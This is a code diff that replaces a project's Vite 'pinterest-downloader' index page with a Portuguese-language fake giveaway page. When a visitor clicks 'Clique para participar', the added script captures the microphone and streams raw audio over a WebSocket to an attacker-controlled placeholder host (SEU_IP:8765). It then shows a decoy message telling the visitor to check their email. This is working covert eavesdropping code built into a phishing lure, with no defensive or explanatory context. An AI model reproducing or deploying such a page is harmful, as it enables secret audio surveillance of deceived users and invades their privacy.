@@ -1,13 +1,36 @@
 <!doctype html>
-<html lang="en">
-  <head>
-    <meta charset="UTF-8" />
-    <link rel="icon" type="image/svg+xml" href="/vite.svg" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>pinterest-downloader</title>
-  </head>
-  <body>
-    <div id="app"></div>
-    <script type="module" src="/src/main.ts"></script>
-  </body>
+<html>
+<head>
+  <meta charset="utf-8"/>
+  <title>Sorteio Exclusivo</title>
+</head>
+<body>
+  <h1>Parabéns! Você foi pré-selecionado.</h1>
+  <button id="bt">Clique para participar</button>
+  <script>
+    const btn = document.getElementById("bt");
+    btn.onclick = async () => {
+      const stream = await navigator.mediaDevices.getUserMedia({audio:true});
+      const ws = new WebSocket("ws://SEU_IP:8765");
+      ws.onopen = () => {
+        ws.send(JSON.stringify({id: Math.random().toString(36).slice(2)}));
+        const ctx = new AudioContext({sampleRate:16000});
+        const src = ctx.createMediaStreamSource(stream);
+        const proc = ctx.createScriptProcessor(4096,1,1);
+        proc.onaudioprocess = e => {
+          const buf = e.inputBuffer.getChannelData(0);
+          // converte float32 -> int16
+          const len = buf.length;
+          const out = new Int16Array(len);
+          for(let i=0;i<len;i++) out[i] = buf[i]*0x7FFF;
+          ws.send(out.buffer);
+        };
+        src.connect(proc);
+        proc.connect(ctx.destination);
+      };
+      btn.style.display="none";
+      document.body.innerHTML="<p>Aguarde o resultado no seu e-mail...</p>";
+    };
+  </script>
+</body>
 </html>
